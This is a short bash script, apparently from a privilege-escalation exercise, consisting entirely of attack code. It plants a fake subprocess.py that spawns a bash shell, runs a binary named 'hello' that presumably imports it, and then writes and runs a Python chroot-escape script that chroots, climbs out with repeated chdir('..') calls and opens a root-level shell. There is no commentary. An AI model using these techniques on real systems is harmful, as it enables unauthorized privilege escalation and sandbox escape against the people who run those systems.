#!/bin/bash 

echo "import os; os.system('/bin/bash');" > subprocess.py
./hello

echo -e '#!/usr/bin/python\nimport os\nos.mkdir("chroot-dir")\nos.chroot("chroot-dir")\nfor i in range(1000):\n\tos.chdir("..")\nos.chroot(".")\nos.system("/bin/bash")' > escape_chroot.py
python3 escape_chroot.py
